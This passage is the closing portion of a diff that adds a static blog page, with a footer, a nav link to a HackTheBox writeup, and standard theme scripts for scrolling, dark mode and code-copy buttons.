+    <span>Blurry Writeup - HackTheBox</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="http://localhost:1313/">Rezy Dev</a></span> · 
+
+    <span>
+        <a href="https://creativecommons.org/licenses/by-nc/4.0/" rel="noopener noreferrer" target="_blank">Some rights reserved</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
